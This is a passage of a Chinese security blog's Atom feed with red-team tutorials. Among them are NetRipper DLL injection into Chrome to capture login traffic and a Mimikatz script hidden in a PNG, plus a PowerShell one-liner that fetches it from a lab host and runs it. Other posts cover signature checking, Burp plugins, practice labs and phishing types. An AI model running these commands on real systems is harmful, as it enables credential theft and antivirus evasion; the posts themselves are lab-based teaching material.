<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>裁决的博客</title>
  
  <subtitle>安全圈小帅哥</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://lilifengcode.github.io/"/>
  <updated>2019-10-31T13:58:58.419Z</updated>
  <id>http://lilifengcode.github.io/</id>
  
  <author>
    <name>裁决</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>数字签名安全验证</title>
    <link href="http://lilifengcode.github.io/post/f1dbfde2.html"/>
    <id>http://lilifengcode.github.io/post/f1dbfde2.html</id>
    <published>2019-10-31T13:58:02.000Z</published>
    <updated>2019-10-31T13:58:58.419Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数字签名安全验证"><a href="#数字签名安全验证" class="headerlink" title="数字签名安全验证"></a>数字签名安全验证</h1><p><a href="https://imgchr.com/i/KZwVqs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/18/KZwVqs.jpg" alt></a></p><h2 id="0x01-数字摘要"><a href="#0x01-数字摘要" class="headerlink" title="0x01 数字摘要"></a>0x01 数字摘要</h2><p>数字摘要是将任意长度的消息变成固定长度的短消息，它类似于一个自变量是消息的函数，也就是Hash函数。数字摘要就是采用单向Hash函数将需要加密的明文“摘要”成一串固定长度（128位）的密文这一串密文又称为数字指纹，它有固定的长度，而且不同的明文摘要成密文，其结果总是不同的，而同样的明文其摘要必定一致。</p><p>一个Hash函数的好坏是由发生碰撞的<a href="https://baike.baidu.com/item/概率/828845" target="_blank" rel="noopener">概率</a>决定的。如果攻击者能够轻易地构造出两个消息具有相同的Hash值，那么这样的Hash函数是很危险的。一般来说，安全Hash标准的输出长度为160位，这样才能保证它足够的安全。 这一加密方法亦称安全Hash编码法（SHA:Secure Hash Algorithm）或MD5(MD Standards for Message Digest)，由Ron Rivest所设计。该编码法采用单向Hash函数将需加密的<a href="https://baike.baidu.com/item/明文/9684633" target="_blank" rel="noopener">明文</a>“摘要”成一串128bit的密文，这一串密文亦称为<a href="https://baike.baidu.com/item/数字指纹/4418985" target="_blank" rel="noopener">数字指纹</a>(Finger Print)，它有固定的长度，且不同的明文摘要成密文，其结果总是不同的，而同样的明文其摘要必定一致。这样这摘要便可成为验证明文是否是“真身”的“<a href="https://baike.baidu.com/item/指纹/60308" target="_blank" rel="noopener">指纹</a>”了</p><h2 id="0x02-数字签名"><a href="#0x02-数字签名" class="headerlink" title="0x02 数字签名"></a>0x02 数字签名</h2><p>数字签名（又称<a href="https://baike.baidu.com/item/公钥" target="_blank" rel="noopener">公钥</a>数字签名）是只有信息的发送者才能产生的别人无法伪造的一段数字串，这段数字串同时也是对信息的发送者发送信息真实性的一个有效证明。它是一种类似写在纸上的普通的物理签名，但是使用了<a href="https://baike.baidu.com/item/公钥加密/6245950" target="_blank" rel="noopener">公钥加密</a>领域的技术来实现的，用于鉴别数字信息的方法。一套数字签名通常定义两种互补的运算，一个用于签名，另一个用于验证。数字签名是非对称<a href="https://baike.baidu.com/item/密钥加密技术" target="_blank" rel="noopener">密钥加密技术</a>与<a href="https://baike.baidu.com/item/数字摘要/4069118" target="_blank" rel="noopener">数字摘要</a>技术的应用</p><h2 id="0x03-数字签名基本流程"><a href="#0x03-数字签名基本流程" class="headerlink" title="0x03 数字签名基本流程"></a>0x03 数字签名基本流程</h2><p>（1） 被发送文件用SHA编码加密产生128bit的数字摘要</p><p>（2） 发送方用自己的私用密钥</p><p>（3） 将原文和加密的摘要同时传给对方。</p><p>（4） 对方用发送方的公共密钥对数字签名解密，同时对收到的文件用SHA编码加密产生又一摘要。</p><p>（5） 将解密后的摘要和收到的文件在接收方重新加密产生的摘要相互对比。如两者一致，则说明传送过程中信息没有被破坏或篡改过。否则不然。</p><p><img src="https://gss2.bdstatic.com/-fo3dSag_xI4khGkpoWK1HF6hhy/baike/c0%3Dbaike80%2C5%2C5%2C80%2C26/sign=2bc369671038534398c28f73f27adb1b/c2cec3fdfc039245c8617b048794a4c27c1e25e0.jpg" alt></p><h2 id="0x04-数字签名验证"><a href="#0x04-数字签名验证" class="headerlink" title="0x04 数字签名验证"></a>0x04 数字签名验证</h2><p>检查某些文件的签名是否合法，通过对其数字签名的验证，可以判断文件是否来源可靠以及文件在传输中间是否被篡改</p><h2 id="0x05-Sigcheck"><a href="#0x05-Sigcheck" class="headerlink" title="0x05 Sigcheck"></a>0x05 Sigcheck</h2><p>Sigcheck是一个命令行实用程序，它显示文件版本号，时间戳信息和数字签名详细信息，包括证书链。</p><p><strong>用法：sigcheck [-a] [-h] [-i] [-e] [-l] [-n] [[-s] | [-c | -ct] | [-m]] [-q] [-r] [-u] [-vt] [-v [r] [s]] [-f目录文件] &lt;文件或目录&gt;</strong></p><p><strong>用法：sigcheck -d [-c | -ct] &lt;文件或目录&gt;</strong></p><p><strong>用法：sigcheck -o [-vt] [-v [r]] &lt;sigcheck csv文件&gt;</strong></p><p><strong>用法：sigcheck -t [u] [v] [-i] [-c | -ct] &lt;证书存储名称| *&gt;</strong></p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><strong>-a</strong></td><td align="left">显示扩展版本信息。报告的熵度量是文件内容信息的每字节位数。</td></tr><tr><td align="left"><strong>-c</strong></td><td align="left">CSV输出，带逗号分隔符</td></tr><tr><td align="left"><strong>-ct</strong></td><td align="left">带有制表符分隔符的CSV输出</td></tr><tr><td align="left"><strong>-d</strong></td><td align="left">转储目录文件的内容</td></tr><tr><td align="left"><strong>-e</strong></td><td align="left">仅扫描可执行映像（无论其扩展名如何）</td></tr><tr><td align="left"><strong>-f</strong></td><td align="left">在指定的目录文件中查找签名</td></tr><tr><td align="left"><strong>-h</strong></td><td align="left">显示文件哈希</td></tr><tr><td align="left"><strong>-i</strong></td><td align="left">显示目录名称和签名链</td></tr><tr><td align="left"><strong>-l</strong></td><td align="left">遍历符号链接和目录结点</td></tr><tr><td align="left"><strong>-m</strong></td><td align="left">转储清单</td></tr><tr><td align="left"><strong>-n</strong></td><td align="left">仅显示文件版本号</td></tr><tr><td align="left"><strong>-o</strong></td><td align="left">使用-h选项时，执行Sigcheck先前捕获的CSV文件中捕获的哈希的“病毒总数”查找。此用法用于扫描脱机系统。</td></tr><tr><td align="left"><strong>-q</strong></td><td align="left">安静（无横幅）</td></tr><tr><td align="left"><strong>-r</strong></td><td align="left">禁用证书吊销检查</td></tr><tr><td align="left"><strong>-s</strong></td><td align="left">递归子目录</td></tr><tr><td align="left"><strong>-t [u] [v]</strong></td><td align="left">转储指定证书存储区的内容（所有存储区都为“ *”）。 指定-tu以查询用户存储（默认为计算机存储）。 附加“ -v”以使Sigcheck下载受信任的Microsoft根证书列表，并且仅输出未植根于该列表中的证书的有效证书。如果无法访问该站点，则使用当前目录中的authrootstl.cab或authroot.stl（如果存在）。</td></tr><tr><td align="left"><strong>-u</strong></td><td align="left">如果启用了VirusTotal检查，则显示VirusTotal未知或检测到非零的文件，否则仅显示未签名的文件。</td></tr><tr><td align="left"><strong>-v [rs]</strong></td><td align="left">根据文件哈希查询VirusTotal（<a href="https://www.virustotal.com/" target="_blank" rel="noopener">www.virustotal.com</a>）是否存在恶意软件。 添加“ r”以打开具有非零检测功能的文件的报告。 如果指定了’s’选项，则报告为先前未扫描的文件将上传到VirusTotal。注意扫描结果可能五分钟或更长时间不可用。</td></tr><tr><td align="left"><strong>-vt</strong></td><td align="left">使用VirusTotal功能之前，您必须接受VirusTotal服务条款。请参阅：<a href="https://www.virustotal.com/en/about/terms-of-service/" target="_blank" rel="noopener">https</a> : <a href="https://www.virustotal.com/en/about/terms-of-service/" target="_blank" rel="noopener">//www.virustotal.com/zh-cn/about/terms-of-service/</a>如果您尚未接受条款，并且省略了此选项，则会提示您互动。</td></tr></tbody></table><h3 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h3><p>使用该工具的一种方法是使用以下命令检查\ Windows \ System32目录中的未签名文件：</p><p><strong>sigcheck -u -ec：\ windows \ system32</strong></p><h3 id="下载："><a href="#下载：" class="headerlink" title="下载："></a>下载：</h3><p><a href="https://download.sysinternals.com/files/Sigcheck.zip" target="_blank" rel="noopener">https://download.sysinternals.com/files/Sigcheck.zip</a></p><h3 id="演示："><a href="#演示：" class="headerlink" title="演示："></a>演示：</h3><p>1.进入sigcheck目录，输入sigcheck 会一个窗口，点击同意即可</p><p><img src="https://s2.ax1x.com/2019/10/18/KZay1e.png" alt></p><p>2.sigcheck +验证的程序</p><p>有签名的</p><p><img src="https://s2.ax1x.com/2019/10/18/KZdBbn.png" alt></p><p>无签名的</p><p><img src="https://s2.ax1x.com/2019/10/18/KZdLxe.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;数字签名安全验证&quot;&gt;&lt;a href=&quot;#数字签名安全验证&quot; class=&quot;headerlink&quot; title=&quot;数字签名安全验证&quot;&gt;&lt;/a&gt;数字签名安全验证&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://imgchr.com/i/KZwVqs&quot; target=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>红队攻防之获取内存中的密码</title>
    <link href="http://lilifengcode.github.io/post/39cded73.html"/>
    <id>http://lilifengcode.github.io/post/39cded73.html</id>
    <published>2019-10-31T13:42:19.000Z</published>
    <updated>2019-10-31T13:44:18.643Z</updated>
    
    <content type="html"><![CDATA[<h1 id="红队攻防之获取内存中的密码"><a href="#红队攻防之获取内存中的密码" class="headerlink" title="红队攻防之获取内存中的密码"></a>红队攻防之获取内存中的密码</h1><p><img src="https://s2.ax1x.com/2019/06/28/ZMdqxS.jpg" alt="ZMdqxS.jpg"></p><h2 id="0X01-NetRipper"><a href="#0X01-NetRipper" class="headerlink" title="0X01 NetRipper"></a>0X01 NetRipper</h2><p>NetRipper是针对Windows系统的后期开发工具，其使用API挂钩来拦截低特权用户的网络流量和与加密相关的功能，从而能够在加密之前/解密之后捕获纯文本流量和加密流量。</p><h2 id="0X02-用法"><a href="#0X02-用法" class="headerlink" title="0X02 用法"></a>0X02 用法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Injection: NetRipper.exe DLLpath.dll processname.exe  </span><br><span class="line">Example:   NetRipper.exe DLL.dll firefox.exe  </span><br><span class="line"></span><br><span class="line">Generate DLL:</span><br><span class="line"></span><br><span class="line">  -h,  --help          Print this help message  </span><br><span class="line">  -w,  --write         Full path for the DLL to write the configuration data  </span><br><span class="line">  -l,  --location      Full path where to save data files (default TEMP)  </span><br><span class="line"></span><br><span class="line">Plugins:</span><br><span class="line"></span><br><span class="line">  -p,  --plaintext     Capture only plain-text data. E.g. true  </span><br><span class="line">  -d,  --datalimit     Limit capture size per request. E.g. 4096  </span><br><span class="line">  -s,  --stringfinder  Find specific strings. E.g. user,pass,config  </span><br><span class="line"></span><br><span class="line">Example: NetRipper.exe -w DLL.dll -l TEMP -p true -d 4096 -s user,pass</span><br></pre></td></tr></table></figure><h3 id="Metasploit模块"><a href="#Metasploit模块" class="headerlink" title="Metasploit模块"></a>Metasploit模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; use post/windows/gather/netripper/netripper </span><br><span class="line">msf post(windows/gather/netripper/netripper) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/windows/gather/netripper/netripper):</span><br><span class="line"></span><br><span class="line">   Name          Current Setting  Required  Description</span><br><span class="line">   ----          ---------------  --------  -----------</span><br><span class="line">   DATALIMIT     65535            no        The number of bytes to save from requests/responses</span><br><span class="line">   DATAPATH      TEMP             no        Where to save files. E.g. C:\Windows\Temp or TEMP</span><br><span class="line">   DLLPATH                        no        Where to find NetRipper DLLs. Default is /usr/share/metasploit-framework...</span><br><span class="line">   PLAINTEXT     false            no        True to save only plain-text data</span><br><span class="line">   PROCESSIDS                     no        Process IDs. E.g. 1244,1256</span><br><span class="line">   PROCESSNAMES                   no        Process names. E.g. firefox.exe,chrome.exe</span><br><span class="line">   SESSION                        yes       The session to run this module on.</span><br><span class="line">   STRINGFINDER  DEFAULT          no        Search for specific strings in captured data</span><br></pre></td></tr></table></figure><p>设置PROCESSNAMES或PROCESSIDS并运行。</p><h3 id="Metasploit安装（Kali）"><a href="#Metasploit安装（Kali）" class="headerlink" title="Metasploit安装（Kali）"></a>Metasploit安装（Kali）</h3><ol><li>mkdir / usr / share / metasploit-framework / modules / post / windows / gather / netripper</li><li>cp Metasploit / netripper.rb /usr/share/metasploit-framework/modules/post/windows/gather/netripper/netripper.rb</li><li>cp x86 / DLL.x86.dll /usr/share/metasploit-framework/modules/post/windows/gather/netripper/DLL.x86.dll</li><li>cp x64 / DLL.x64.dll /usr/share/metasploit-framework/modules/post/windows/gather/netripper/DLL.x64.dll</li></ol><h4 id="Metasploit安装（后备箱）"><a href="#Metasploit安装（后备箱）" class="headerlink" title="Metasploit安装（后备箱）"></a>Metasploit安装（后备箱）</h4><ol><li>mkdir / opt / metasploit-framework / modules / post / windows / gather / netripper</li><li>cp Metasploit / netripper.rb /opt/metasploit-framework/modules/post/windows/gather/netripper/netripper.rb</li><li>cp x86 / DLL.x86.dll /opt/metasploit-framework/modules/post/windows/gather/netripper/DLL.x86.dll</li><li>cp x64 / DLL.x64.dll /opt/metasploit-framework/modules/post/windows/gather/netripper/DLL.x64.dll</li></ol><h2 id="0x03-操作演示"><a href="#0x03-操作演示" class="headerlink" title="0x03  操作演示"></a>0x03  操作演示</h2><p>执行命令，将DLL文件注入到chrome浏览器里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NetRipper.x64.exe &quot;C:\Users\ailishi\Downloads\NetRipper-master\x64\DLL.x64.dll&quot; chrome.exe</span><br></pre></td></tr></table></figure><p>登录一个网站就行</p><p><img src="https://s2.ax1x.com/2019/09/29/u82SNF.gif" alt="img"></p><p>登录一个网站就行，查看temp</p><p><img src="https://s2.ax1x.com/2019/09/29/u82QgA.gif" alt="img"></p><p>通过POWERSHELL也行</p><p><img src="https://s2.ax1x.com/2019/09/29/u8WkTK.gif" alt="img"></p><h2 id="0x04-思路"><a href="#0x04-思路" class="headerlink" title="0x04 思路"></a><strong>0x04 思路</strong></h2><p>可以在入侵主机上注入进程进而获取重要信息，可以结合MSF进行操作</p><h2 id="0x05-参考项目主页"><a href="#0x05-参考项目主页" class="headerlink" title="0x05 参考项目主页"></a><strong>0x05 参考项目主页</strong></h2><p><a href="https://github.com/NytroRST/NetRipper" target="_blank" rel="noopener">https://github.com/NytroRST/NetRipper</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;红队攻防之获取内存中的密码&quot;&gt;&lt;a href=&quot;#红队攻防之获取内存中的密码&quot; class=&quot;headerlink&quot; title=&quot;红队攻防之获取内存中的密码&quot;&gt;&lt;/a&gt;红队攻防之获取内存中的密码&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>红队攻防之图片免杀执行远程命令</title>
    <link href="http://lilifengcode.github.io/post/ac384f73.html"/>
    <id>http://lilifengcode.github.io/post/ac384f73.html</id>
    <published>2019-10-31T13:41:16.000Z</published>
    <updated>2019-10-31T13:44:18.643Z</updated>
    
    <content type="html"><![CDATA[<h1 id="红队攻防之图片免杀执行远程命令"><a href="#红队攻防之图片免杀执行远程命令" class="headerlink" title="红队攻防之图片免杀执行远程命令"></a>红队攻防之图片免杀执行远程命令</h1><p><img src="https://s2.ax1x.com/2019/09/29/u8pRqP.jpg" alt></p><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>powershell与图片通过Invoke-PSImage合成执行远程命令</p><h1 id="0x02-Invoke-PSImage"><a href="#0x02-Invoke-PSImage" class="headerlink" title="0x02 Invoke-PSImage"></a>0x02 Invoke-PSImage</h1><p>Invoke-PSImage使用PowerShell脚本并将该脚本的字节编码为PNG图像的像素。它从Web的文件生成一个oneliner来执行。</p><p>它可以仅使用有效载荷数据来创建新图像，也可以将有效载荷嵌入现有图像的最低有效字节中，以便看起来像实际的图片。图像保存为PNG，并且可以无损压缩，而不会影响执行有效载荷的能力，因为数据本身以颜色存储。创建新图像时，通常会对常规PowerShell脚本进行显着压缩，通常会生成png，其文件大小约为原始脚本的50％。</p><p>使用embed方法时，每个像素中2个颜色值的最低有效4位用于保存有效负载。结果会降低图像质量，但看起来仍然不错。它可以接受大多数图像类型作为输入，但是输出始终是PNG，因为它需要无损。图像的每个像素都用于保存脚本的一个字节，因此您需要一个图像，其像素至少与脚本中的字节一样多。这相当容易-例如，Invoke-Mimikatz适合1920x1200的图像。</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p><strong>-Script</strong> [filepath]嵌入到图像中的脚本的路径。</p><p><strong>-Out</strong> [filepath]将结果图像保存到的文件（图像将为PNG）</p><p><strong>-Image</strong> [filepath]要嵌入脚本的图像。（可选）</p><p><strong>-WebRequest</strong> 输出用于使用Net.WebClient从Web读取图像的命令。您将需要托管图像并将URL插入命令中。</p><p><strong>-PictureBox</strong> 输出用于使用System.Windows.Forms.PictureBox从Web读取图像的命令。您将需要托管图像并将URL插入命令中。</p><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><p>创建一个嵌入了脚本“ Invoke-Mimikatz.ps1”的映像，并输出一个oneliner以从磁盘执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS&gt;Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg</span><br><span class="line">   [Oneliner to execute from a file]</span><br></pre></td></tr></table></figure><p>创建一个嵌入了脚本“ Invoke-Mimikatz.ps1”的图像，然后输出一个oneliner以从Web执行（您仍然必须托管该图像并编辑URL）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS&gt;Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg -WebRequest</span><br><span class="line">   [Oneliner to execute from the web]</span><br></pre></td></tr></table></figure><p>执行网络上托管的图像：</p><p><img src="https://github.com/peewpw/Invoke-PSImage/raw/master/images/ps_kiwi.png" alt></p><h2 id="0x03-操作演示"><a href="#0x03-操作演示" class="headerlink" title="0x03 操作演示"></a>0x03 操作演示</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>1.图片（2000*2000）左右或者以上 ，注：我曾用过8K之上的图片，合成了三个多小时emmmm</p><p>2.Invoke-PSImage</p><p>3.Invoke-Mimikatz（powershell脚本，当然你也可以自己写或者利用msf、cs神器等等生成ps脚本）</p><p>4.w7虚拟机web环境</p><p><img src="https://s2.ax1x.com/2019/09/28/u1IFIK.png" alt></p><h3 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-PSImage.ps1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\caijue.png -Out .\caijueshell.png -Web</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/28/u1IOeI.png" alt></p><p>将生成的图片放入远程服务器</p><p>并在本地执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(&quot;http://192.168.21.135/caijueshell.png&quot;));$o=a Byte [] 2204160;(0..573)|%&#123;foreach($x in(0..3839))&#123;$p=$g.GetPixel($x,$_);$o[$_*3840+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))&#125;&#125;;IEX([Sys tem.Text.Encoding]::ASCII.GetString($o[0..2204116])):Invoke-Mimikatz</span><br></pre></td></tr></table></figure><p>理论上没问题，但是我出错了，，，后来感觉可能是mimikatz的问题，用msfvenom生成一个ps操作，，，发现好像是ps的问题，不搞了2点了，狗命要紧</p><p><img src="https://s2.ax1x.com/2019/09/29/u3jzwD.gif" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;红队攻防之图片免杀执行远程命令&quot;&gt;&lt;a href=&quot;#红队攻防之图片免杀执行远程命令&quot; class=&quot;headerlink&quot; title=&quot;红队攻防之图片免杀执行远程命令&quot;&gt;&lt;/a&gt;红队攻防之图片免杀执行远程命令&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>漏洞演练平台汇总</title>
    <link href="http://lilifengcode.github.io/post/b6304875.html"/>
    <id>http://lilifengcode.github.io/post/b6304875.html</id>
    <published>2019-10-31T13:37:35.000Z</published>
    <updated>2019-10-31T13:44:18.643Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞演练平台汇总"><a href="#漏洞演练平台汇总" class="headerlink" title="漏洞演练平台汇总"></a>漏洞演练平台汇总</h1><ol><li><a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="noopener">https://github.com/710leo/ZVulDrill</a> </li><li><a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a></li><li><a href="https://sourceforge.net/projects/bwapp/" target="_blank" rel="noopener">https://sourceforge.net/projects/bwapp/</a>         个人使用</li><li><a href="https://vulhub.org/" target="_blank" rel="noopener">https://vulhub.org/</a>                                               个人使用</li><li><a href="https://github.com/adamdoupe/WackoPicko" target="_blank" rel="noopener">https://github.com/adamdoupe/WackoPicko</a></li><li><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a>                   个人使用        </li><li><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a>                             </li><li><a href="http://test.xss.tv/" target="_blank" rel="noopener">http://test.xss.tv/</a>                                                    建议自己源码搭建，不解释</li><li><img src="https://s2.ax1x.com/2019/09/29/u8F6BR.png" alt></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;漏洞演练平台汇总&quot;&gt;&lt;a href=&quot;#漏洞演练平台汇总&quot; class=&quot;headerlink&quot; title=&quot;漏洞演练平台汇总&quot;&gt;&lt;/a&gt;漏洞演练平台汇总&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/710leo/ZVulD
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Burpsuite Plugin-BurpBounty</title>
    <link href="http://lilifengcode.github.io/post/2082541d.html"/>
    <id>http://lilifengcode.github.io/post/2082541d.html</id>
    <published>2019-08-29T13:51:02.383Z</published>
    <updated>2019-10-29T13:34:25.456Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Burpsuite-BurpBounty"><a href="#Burpsuite-BurpBounty" class="headerlink" title="Burpsuite-BurpBounty"></a>Burpsuite-BurpBounty</h1><p><img src="https://s2.ax1x.com/2019/09/01/nS0ytK.jpg" alt="nS0ytK.jpg">                                                                                                                      </p><a id="more"></a><p>BurpBounty介绍</p><p>Burp Bounty（BApp商店中的扫描检查生成器）是Burp Suite的扩展，它允许您以快速简单的方式通过非常直观的图形界面通过个性化规则改进主动和被动扫描仪。</p><h2 id="下载-安装"><a href="#下载-安装" class="headerlink" title="下载-安装"></a>下载-安装</h2><p>链接：<a href="https://github.com/wagiro/BurpBounty/releases" target="_blank" rel="noopener">https://github.com/wagiro/BurpBounty/releases</a></p><p>1.在burp extender模块加载插件 </p><p><img src="https://s2.ax1x.com/2019/05/14/EoB6TH.png" alt></p><p>2.显示界面</p><p><img src="https://s2.ax1x.com/2019/05/14/EoDr3q.png" alt></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>1.选择 Profiles Directory</p><p><img src="https://s2.ax1x.com/2019/05/16/Eb4i80.png" alt></p><p>2.加载字典</p><p><img src="https://s2.ax1x.com/2019/05/16/Eb4qo9.png" alt></p><p><img src="https://s2.ax1x.com/2019/05/16/EbIu1x.png" alt></p><p>3.过滤设置为all,扫描的时候启动全部项目</p><p><img src="https://s2.ax1x.com/2019/05/16/EbIJNd.png" alt></p><p><img src="https://s2.ax1x.com/2019/05/16/EbIhuT.png" alt></p><p>4.实验环境-DVWA</p><p><img src="https://s2.ax1x.com/2019/05/16/EboF2t.png" alt></p><p>5.抓包拦截-执行主动扫描</p><p><a href="https://imgchr.com/i/EboZqS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/16/EboZqS.md.png" alt="EboZqS.md.png"></a></p><p>6.扫描结果</p><p><a href="https://imgchr.com/i/EbocZD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/16/EbocZD.md.png" alt="EbocZD.md.png"></a></p><h2 id="添加扫描项目"><a href="#添加扫描项目" class="headerlink" title="添加扫描项目"></a>添加扫描项目</h2><p>1.命名</p><p>2.作者</p><p>3.选择扫描方式：主动扫描</p><p>4.选择request方式加载payload</p><p>5.选择payload设置：替换、添加</p><p>6.当然也可以选择payload编码方式</p><p><img src="https://s2.ax1x.com/2019/05/14/Eo64eK.png" alt></p><p>7.选择response方式,设置payload返回包匹配规则</p><p><img src="https://s2.ax1x.com/2019/05/14/EocUte.png" alt></p><p>8.选择issue,设置漏洞等级，细节描述等</p><p><img src="https://s2.ax1x.com/2019/05/14/Eocfpj.png" alt></p><h4 id="注-更多插件用法-请转到-https-github-com-lilifengcode-Burpsuite-Plugins-Usage"><a href="#注-更多插件用法-请转到-https-github-com-lilifengcode-Burpsuite-Plugins-Usage" class="headerlink" title="注:更多插件用法,请转到:https://github.com/lilifengcode/Burpsuite-Plugins-Usage"></a>注:更多插件用法,请转到:<a href="https://github.com/lilifengcode/Burpsuite-Plugins-Usage" target="_blank" rel="noopener">https://github.com/lilifengcode/Burpsuite-Plugins-Usage</a></h4>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Burpsuite-BurpBounty&quot;&gt;&lt;a href=&quot;#Burpsuite-BurpBounty&quot; class=&quot;headerlink&quot; title=&quot;Burpsuite-BurpBounty&quot;&gt;&lt;/a&gt;Burpsuite-BurpBounty&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/09/01/nS0ytK.jpg&quot; alt=&quot;nS0ytK.jpg&quot;&gt;                                                                                                                      &lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HW社会工程学攻击---钓鱼</title>
    <link href="http://lilifengcode.github.io/post/6f20dcf1.html"/>
    <id>http://lilifengcode.github.io/post/6f20dcf1.html</id>
    <published>2019-06-28T10:58:36.000Z</published>
    <updated>2019-06-30T15:19:31.730Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.ax1x.com/2019/06/28/ZMdqxS.jpg" alt="ZMdqxS.jpg"></p><h2 id="钓鱼方式"><a href="#钓鱼方式" class="headerlink" title="钓鱼方式"></a>钓鱼方式</h2><ol><li>钓鱼邮件</li></ol><p>钓鱼邮件指利用伪装的电邮，欺骗收件人将账号、口令等信息回复给指定的接收者；或引导收件人连接到特制的网页，这些网页通常会伪装成和真实网站一样，如银行或理财的网页，令登录者信以为真，输入信用卡或银行卡号码、账户名称及密码等而被盗取。</p><ol start="2"><li>钓鱼wifi</li></ol><p>仿造一个假的wifi,欺骗用户登陆，之后窃取用户信息</p><ol start="3"><li>钓鱼二维码</li></ol><p>网站地址（URL）被编成QR二维码，有些网站将网站登录的URL存储在QR码上。攻击者用伪造的QR码替换合法的QR码，篡改登录网站的URL信息，将用户导向一个假冒的登录页面。在这种情况下，用户扫描QR码后，访问了伪造的登陆页面，将个人信息泄露给了攻击者。</p><p>注:共享单车二位码…</p><ol start="4"><li>伪基站</li></ol><p>又称假基站、假基地台，是一种利用GSM单向认证缺陷的非法无线电通信设备，主要由主机和笔记本电脑组成，能够搜取以其为中心、一定半径范围内的GSM移动电话信息，并任意冒用他人手机号码强行向用户手机发送诈骗、推销等垃圾短信，通常安放在汽车或者一个比较隐蔽的地方发送。</p><p>伪基站+短信+网页……</p><ol start="5"><li>标签钓鱼</li></ol><p>标签钓鱼(tabnabbing)是一种新的网络钓鱼攻击手法，该攻击手法是由Mozilla Firefox浏览器的界面及创意负责人Aza 